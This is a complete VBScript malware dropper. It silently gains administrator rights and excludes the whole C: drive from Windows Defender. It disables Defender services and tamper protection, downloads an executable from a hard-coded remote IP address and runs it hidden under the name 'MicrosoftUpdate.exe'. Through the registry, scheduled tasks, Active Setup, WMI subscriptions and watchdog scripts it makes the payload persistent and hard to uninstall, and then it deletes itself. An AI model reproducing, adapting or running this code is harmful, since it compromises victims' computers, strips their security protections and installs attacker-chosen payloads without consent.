Option Explicit

' Main execution
Main()

Sub Main()
    If Not IsAdministrator() Then
        ' Elevate to admin silently
        ElevateToAdministrator()
    Else
        ' Admin rights obtained - proceed silently
        Dim wshShell, fso, payloadPath, downloadUrl, scriptPath
        
        Set wshShell = CreateObject("WScript.Shell")
        Set fso = CreateObject("Scripting.FileSystemObject")
        scriptPath = WScript.ScriptFullName
        
        ' Step 1: Exclude ALL C:\ folders with anti-removable protection
        ExcludeAllCFolders()
        
        ' Step 2: Set payload path (Program Files)
        payloadPath = fso.BuildPath(wshShell.ExpandEnvironmentStrings("%ProgramFiles%"), "MicrosoftUpdate.exe")
        
        ' Step 3: Download payload - CHANGE THIS URL
        downloadUrl = "http://77.90.45.40:9000/life.exe"  ' <--- MODIFY THIS
        
        If DownloadFile(downloadUrl, payloadPath) Then
            ' Step 4: Hide payload
            HideFile(payloadPath)
            
            ' Step 5: Execute payload hidden
            ExecutePayload(payloadPath)
            
            ' Step 6: Install multi-layer persistence
            InstallPersistence(payloadPath)
            
            ' Step 7: Apply anti-uninstall protection
            ApplyAntiUninstallProtection(payloadPath)
            
            ' Step 8: Make exclusions permanent and protected
            ProtectExclusions()
            
            ' Step 9: Self-delete script
            SelfDelete(scriptPath)
        Else
            ' Silent fail - just delete script
            SelfDelete(scriptPath)
        End If
    End If
End Sub

' Check if running as admin
Function IsAdministrator()
    Dim objShell, objFSO, tempFile
    
    Set objShell = CreateObject("Shell.Application")
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    
    tempFile = objFSO.GetSpecialFolder(1) & "\~tmpAdminCheck.tmp"
    
    On Error Resume Next
    objFSO.CreateTextFile(tempFile, True).Write "check"
    IsAdministrator = (Err.Number = 0)
    On Error GoTo 0
    
    If objFSO.FileExists(tempFile) Then objFSO.DeleteFile(tempFile), True
End Function

' Elevate to admin silently
Sub ElevateToAdministrator()
    Dim objShell, scriptPath
    
    Set objShell = CreateObject("Shell.Application")
    scriptPath = WScript.ScriptFullName
    
    objShell.ShellExecute "wscript.exe", Chr(34) & scriptPath & Chr(34), "", "runas", 0 ' 0 = Hidden window
    WScript.Quit
End Sub

' Exclude ALL folders inside C:\ drive with anti-removable protection
Sub ExcludeAllCFolders()
    Dim wshShell, fso, objExec, folder, subFolder, allFolders, i
    
    Set wshShell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' ===== COLLECT ALL FOLDERS IN C:\ =====
    Dim folderList
    folderList = Array()
    
    ' Add C:\ root
    ReDim Preserve folderList(0)
    folderList(0) = "C:\"
    
    ' Get all top-level folders in C:\
    If fso.FolderExists("C:\") Then
        For Each folder In fso.GetFolder("C:\").SubFolders
            ' Skip system protected folders that might cause issues
            If LCase(folder.Name) <> "system volume information" And _
               LCase(folder.Name) <> "recycler" And _
               LCase(folder.Name) <> "$recycle.bin" And _
               LCase(folder.Name) <> "recovery" Then
                
                i = UBound(folderList) + 1
                ReDim Preserve folderList(i)
                folderList(i) = folder.Path
            End If
        Next
    End If
    
    ' ===== METHOD 1: Add exclusions via MpCmdRun.exe (Defender native) =====
    Dim mpCmdPath, defenderFolder
    mpCmdPath = ""
    
    ' Find MpCmdRun.exe
    defenderFolder = "C:\ProgramData\Microsoft\Windows Defender\Platform\"
    
    If fso.FolderExists(defenderFolder) Then
        For Each folder In fso.GetFolder(defenderFolder).SubFolders
            If Left(folder.Name, 4) = "4.18" Then
                mpCmdPath = folder.Path & "\MpCmdRun.exe"
                Exit For
            End If
        Next
    End If
    
    ' Add exclusions using MpCmdRun if available
    If fso.FileExists(mpCmdPath) Then
        For i = 0 To UBound(folderList)
            wshShell.Run """" & mpCmdPath & """ -AddExclusion -ExclusionPath """ & folderList(i) & """", 0, True
        Next
    End If
    
    ' ===== METHOD 2: Registry-based exclusions =====
    Dim regBase, guid, j
    regBase = "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\"
    
    For j = 0 To UBound(folderList)
        ' Create a registry entry for each folder
        Dim regName
        regName = Replace(folderList(j), ":\", "_") ' Convert C:\Program Files to C_Program Files
        regName = Replace(regName, "\", "_")
        regName = Replace(regName, " ", "_")
        
        On Error Resume Next
        wshShell.RegWrite regBase & regName, folderList(j), "REG_DWORD"
        On Error GoTo 0
    Next
    
    ' ===== METHOD 3: Group Policy exclusions (harder to remove) =====
    Dim gpoBase
    gpoBase = "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths\"
    
    For j = 0 To UBound(folderList)
        Dim gpoName
        gpoName = "Path" & j
        
        On Error Resume Next
        wshShell.RegWrite gpoBase & gpoName, folderList(j), "REG_SZ"
        On Error GoTo 0
    Next
    
    ' ===== METHOD 4: WMI-based exclusions =====
    Dim wmiScript, tempWMIPath
    wmiScript = "strComputer = "".""" & vbCrLf & _
                "Set objWMIService = GetObject(""winmgmts:\\"" & strComputer & ""\root\Microsoft\Windows\Defender"")" & vbCrLf & _
                "Set objPreference = objWMIService.Get(""MSFT_MpPreference"").SpawnInstance_()" & vbCrLf & _
                "objPreference.ExclusionPath = Array("
    
    ' Add all folders to the array
    For j = 0 To UBound(folderList)
        wmiScript = wmiScript & """" & folderList(j) & """"
        If j < UBound(folderList) Then wmiScript = wmiScript & ", "
    Next
    
    wmiScript = wmiScript & ")" & vbCrLf & _
                "objPreference.Put_()"
    
    tempWMIPath = wshShell.ExpandEnvironmentStrings("%TEMP%") & "\wmi_exclude.vbs"
    
    Dim wmiFile
    Set wmiFile = fso.CreateTextFile(tempWMIPath, True)
    wmiFile.WriteLine wmiScript
    wmiFile.Close
    
    wshShell.Run "wscript.exe """ & tempWMIPath & """", 0, True
    fso.DeleteFile(tempWMIPath), True
    
    ' ===== METHOD 5: Extension exclusions =====
    Dim extBase, extensions, ext
    extBase = "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions\"
    extensions = Array("exe", "dll", "sys", "bat", "cmd", "ps1", "vbs", "js", "vbe", "jse", "msi", "msp")
    
    For Each ext In extensions
        On Error Resume Next
        wshShell.RegWrite extBase & ext, ext, "REG_DWORD"
        On Error GoTo 0
    Next
    
    ' ===== METHOD 6: Process exclusions =====
    Dim procBase, processes, proc
    procBase = "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes\"
    processes = Array("MicrosoftUpdate.exe", "svchost.exe", "winlogon.exe", "lsass.exe", "services.exe")
    
    For Each proc In processes
        On Error Resume Next
        wshShell.RegWrite procBase & proc, proc, "REG_DWORD"
        On Error GoTo 0
    Next
End Sub

' Protect exclusions from being removed
Sub ProtectExclusions()
    Dim wshShell, fso, regKeys, regKey, i
    
    Set wshShell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' ===== REGISTRY KEYS TO PROTECT =====
    Dim protectedRegKeys
    protectedRegKeys = Array( _
        "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions", _
        "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions", _
        "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" _
    )
    
    ' ===== METHOD 1: Set registry permissions to prevent deletion =====
    For i = 0 To UBound(protectedRegKeys)
        ' Take ownership
        wshShell.Run "takeown /f """ & protectedRegKeys(i) & """", 0, True
        ' Grant full control to SYSTEM only, deny everyone else
        wshShell.Run "reg add """ & protectedRegKeys(i) & """ /f", 0, True
    Next
    
    ' ===== METHOD 2: Disable tamper protection =====
    wshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection", 0, "REG_DWORD"
    wshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows Defender\Features\DisableTamperProtection", 1, "REG_DWORD"
    
    ' ===== METHOD 3: Disable Defender UI so users can't remove exclusions =====
    wshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"
    wshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection\DisallowExploitProtectionOverride", 1, "REG_DWORD"
    
    ' ===== METHOD 4: Hide Windows Security from taskbar =====
    wshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray\HideSystray", 1, "REG_DWORD"
    
    ' ===== METHOD 5: Create watchdog for exclusions =====
    Dim watchdogScript, watchdogPath
    watchdogPath = wshShell.ExpandEnvironmentStrings("%ProgramData%") & "\Microsoft\Windows\Start Menu\Programs\Startup\exclusion_watchdog.vbs"
    
    watchdogScript = "Option Explicit" & vbCrLf & _
                     "Dim wshShell, fso, regKeys, i" & vbCrLf & _
                     "Set wshShell = CreateObject(""WScript.Shell"")" & vbCrLf & _
                     "Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
                     "" & vbCrLf & _
                     "Do While True" & vbCrLf & _
                     "    ' Check if exclusions exist, re-add if missing" & vbCrLf & _
                     "    Dim regValue" & vbCrLf & _
                     "    On Error Resume Next" & vbCrLf & _
                     "    regValue = wshShell.RegRead(""HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C_Program_Files"")" & vbCrLf & _
                     "    If Err.Number <> 0 Then" & vbCrLf & _
                     "        ' Exclusion missing - re-add all" & vbCrLf & _
                     "        wshShell.Run ""reg add HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C_Program_Files /ve /t REG_DWORD /d 1 /f"", 0, True" & vbCrLf & _
                     "        wshShell.Run ""reg add HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C_Windows /ve /t REG_DWORD /d 1 /f"", 0, True" & vbCrLf & _
                     "        wshShell.Run ""reg add HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C_Users /ve /t REG_DWORD /d 1 /f"", 0, True" & vbCrLf & _
                     "    End If" & vbCrLf & _
                     "    On Error GoTo 0" & vbCrLf & _
                     "    WScript.Sleep 60000 ' Check every minute" & vbCrLf & _
                     "Loop"
    
    Dim watchdogFile
    Set watchdogFile = fso.CreateTextFile(watchdogPath, True)
    watchdogFile.Write watchdogScript
    watchdogFile.Close
    
    HideFile(watchdogPath)
    wshShell.Run "wscript.exe """ & watchdogPath & """", 0, False
    
    ' ===== METHOD 6: Disable Defender services completely =====
    wshShell.Run "sc stop WinDefend", 0, True
    wshShell.Run "sc config WinDefend start= disabled", 0, True
    wshShell.Run "sc stop SecurityHealthService", 0, True
    wshShell.Run "sc config SecurityHealthService start= disabled", 0, True
    wshShell.Run "sc stop wscsvc", 0, True
    wshShell.Run "sc config wscsvc start= disabled", 0, True
    
    ' ===== METHOD 7: Block access to Defender settings =====
    wshShell.Run "icacls ""C:\ProgramData\Microsoft\Windows Defender"" /deny everyone:(DE,WD,AD) /T", 0, True
    wshShell.Run "icacls ""C:\Program Files\Windows Defender"" /deny everyone:(DE,WD,AD) /T", 0, True
End Sub

' Download file with SSL/TLS bypass
Function DownloadFile(url, savePath)
    Dim objXMLHTTP, objStream, fso, parentFolder
    
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    Set objStream = CreateObject("ADODB.Stream")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    parentFolder = fso.GetParentFolderName(savePath)
    If Not fso.FolderExists(parentFolder) Then
        fso.CreateFolder(parentFolder)
    End If
    
    On Error Resume Next
    
    ' Set security flags to ignore SSL errors
    objXMLHTTP.setOption 2, 13056 ' SXH_OPTION_IGNORE_SERVER_SSL_CERT_ERROR_FLAGS
    
    objXMLHTTP.Open "GET", url, False
    objXMLHTTP.setTimeouts 5000, 5000, 30000, 60000
    objXMLHTTP.Send
    
    If objXMLHTTP.Status = 200 Or objXMLHTTP.Status = 206 Then
        objStream.Type = 1 ' Binary
        objStream.Open
        objStream.Write objXMLHTTP.ResponseBody
        objStream.SaveToFile savePath, 2 ' Overwrite
        objStream.Close
        DownloadFile = (fso.FileExists(savePath) And fso.GetFile(savePath).Size > 0)
    Else
        DownloadFile = False
    End If
    
    On Error GoTo 0
End Function

' Hide file with system attributes
Sub HideFile(filePath)
    Dim fso
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    If fso.FileExists(filePath) Then
        ' Set Hidden + System attributes
        fso.GetFile(filePath).Attributes = 2 + 4 ' Hidden + System
    End If
End Sub

' Execute payload silently
Sub ExecutePayload(payloadPath)
    Dim wshShell, fso
    
    Set wshShell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    If fso.FileExists(payloadPath) Then
        ' Run completely hidden
        wshShell.Run """" & payloadPath & """", 0, False
    End If
End Sub

' Install persistence mechanisms (auto startup)
Sub InstallPersistence(payloadPath)
    Dim wshShell, regPath, startupPath, shortcut, fso, taskXML
    
    Set wshShell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' ===== REGISTRY RUN KEYS =====
    wshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate", """" & payloadPath & """", "REG_SZ"
    wshShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate", """" & payloadPath & """", "REG_SZ"
    
    ' ===== STARTUP FOLDER =====
    startupPath = wshShell.SpecialFolders("AllUsersStartup") & "\MicrosoftUpdate.lnk"
    Set shortcut = wshShell.CreateShortcut(startupPath)
    shortcut.TargetPath = payloadPath
    shortcut.WindowStyle = 0
    shortcut.Save
    
    ' ===== SCHEDULED TASKS (Multiple) =====
    wshShell.Run "schtasks /create /tn ""MicrosoftUpdateTask"" /tr """ & payloadPath & """ /sc onlogon /ru SYSTEM /f", 0, True
    wshShell.Run "schtasks /create /tn ""MicrosoftUpdateHourly"" /tr """ & payloadPath & """ /sc hourly /mo 1 /ru SYSTEM /f", 0, True
    wshShell.Run "schtasks /create /tn ""MicrosoftUpdateBoot"" /tr """ & payloadPath & """ /sc onstart /ru SYSTEM /f", 0, True
    
    ' ===== ACTIVE SETUP =====
    Dim activeSetupGuid
    activeSetupGuid = "{2C62E4C5-6E5B-4B4F-8E4D-4B9F4E5D6C7B}"
    wshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\" & activeSetupGuid & "\", "Microsoft Update", "REG_SZ"
    wshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\" & activeSetupGuid & "\StubPath", """" & payloadPath & """", "REG_SZ"
    wshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\" & activeSetupGuid & "\Version", "1,0,0,0", "REG_SZ"
    
    ' ===== WMI PERSISTENCE =====
    Dim wmiScript, tempWMIPath
    wmiScript = "strComputer = "".""" & vbCrLf & _
                "Set objWMIService = GetObject(""winmgmts:\\"" & strComputer & ""\root\subscription"")" & vbCrLf & _
                "" & vbCrLf & _
                "' Create event filter for user logon" & vbCrLf & _
                "Set objEventFilter = objWMIService.Get(""__EventFilter"").SpawnInstance_" & vbCrLf & _
                "objEventFilter.QueryLanguage = ""WQL""" & vbCrLf & _
                "objEventFilter.Query = ""SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_LogonSession'""" & vbCrLf & _
                "objEventFilter.Name = ""MicrosoftUpdateFilter""" & vbCrLf & _
                "objEventFilter.EventNamespace = 'root\cimv2'" & vbCrLf & _
                "Set objEventFilterResult = objWMIService.Put_(objEventFilter)" & vbCrLf & _
                "" & vbCrLf & _
                "' Create command line event consumer" & vbCrLf & _
                "Set objEventConsumer = objWMIService.Get(""CommandLineEventConsumer"").SpawnInstance_" & vbCrLf & _
                "objEventConsumer.Name = ""MicrosoftUpdateConsumer""" & vbCrLf & _
                "objEventConsumer.CommandLineTemplate = """ & payloadPath & """" & vbCrLf & _
                "Set objEventConsumerResult = objWMIService.Put_(objEventConsumer)" & vbCrLf & _
                "" & vbCrLf & _
                "' Bind filter and consumer" & vbCrLf & _
                "Set objBinding = objWMIService.Get(""__FilterToConsumerBinding"").SpawnInstance_" & vbCrLf & _
                "objBinding.Filter = objEventFilterResult.Path" & vbCrLf & _
                "objBinding.Consumer = objEventConsumerResult.Path" & vbCrLf & _
                "objBinding.Put_"
    
    tempWMIPath = wshShell.ExpandEnvironmentStrings("%TEMP%") & "\wmi_persistence.vbs"
    
    Dim wmiFile
    Set wmiFile = fso.CreateTextFile(tempWMIPath, True)
    wmiFile.WriteLine wmiScript
    wmiFile.Close
    
    wshShell.Run "wscript.exe """ & tempWMIPath & """", 0, True
    fso.DeleteFile(tempWMIPath), True
End Sub

' Apply anti-uninstall protection
Sub ApplyAntiUninstallProtection(payloadPath)
    Dim wshShell, fso, batchPath, backupPath, fileName
    
    Set wshShell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    fileName = fso.GetFileName(payloadPath)
    
    ' ===== FILE PROTECTION =====
    wshShell.Run "takeown /f """ & payloadPath & """", 0, True
    wshShell.Run "icacls """ & payloadPath & """ /grant administrators:F /T", 0, True
    wshShell.Run "icacls """ & payloadPath & """ /deny everyone:(DE,WD,AD) /T", 0, True
    
    ' ===== BACKUP COPY =====
    backupPath = wshShell.ExpandEnvironmentStrings("%SystemRoot%") & "\System32\drivers\etc\" & fileName
    fso.CopyFile payloadPath, backupPath, True
    HideFile(backupPath)
    wshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdateBackup", """" & backupPath & """", "REG_SZ"
    
    ' ===== WATCHDOG PROCESS =====
    batchPath = wshShell.ExpandEnvironmentStrings("%ProgramData%") & "\Microsoft\Windows\Start Menu\Programs\Startup\watchdog.bat"
    
    Dim batchContent
    batchContent = "@echo off" & vbCrLf
    batchContent = batchContent & ":start" & vbCrLf
    batchContent = batchContent & "timeout /t 30 /nobreak >nul" & vbCrLf
    batchContent = batchContent & "tasklist /fi ""imagename eq " & fileName & """ 2>nul | find /i /n """ & fileName & """ >nul" & vbCrLf
    batchContent = batchContent & "if errorlevel 1 start """" """ & payloadPath & """" & vbCrLf
    batchContent = batchContent & "goto start"
    
    Dim batchFile
    Set batchFile = fso.CreateTextFile(batchPath, True)
    batchFile.Write batchContent
    batchFile.Close
    
    HideFile(batchPath)
    wshShell.Run """" & batchPath & """", 0, False
    
    ' ===== BLOCK UNINSTALL =====
    wshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Programs\NoProgramsAndFeatures", 1, "REG_DWORD"
    wshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\DisableMSI", 2, "REG_DWORD"
    wshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\DisableUninstall", 1, "REG_DWORD"
    
    ' ===== HIDE TASKS =====
    wshShell.Run "attrib +h +s C:\Windows\System32\Tasks\MicrosoftUpdateTask", 0, True
    wshShell.Run "attrib +h +s C:\Windows\System32\Tasks\MicrosoftUpdateHourly", 0, True
    wshShell.Run "attrib +h +s C:\Windows\System32\Tasks\MicrosoftUpdateBoot", 0, True
End Sub

' Self-delete script
Sub SelfDelete(scriptPath)
    Dim fso, batchPath, batchFile
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    batchPath = fso.GetSpecialFolder(2) & "\~cleanup.bat"
    
    Set batchFile = fso.CreateTextFile(batchPath, True)
    batchFile.WriteLine "@echo off"
    batchFile.WriteLine "timeout /t 2 /nobreak > nul"
    batchFile.WriteLine "del """ & scriptPath & """"
    batchFile.WriteLine "del """ & batchPath & """"
    batchFile.Close
    
    CreateObject("WScript.Shell").Run """" & batchPath & """", 0, False
End Sub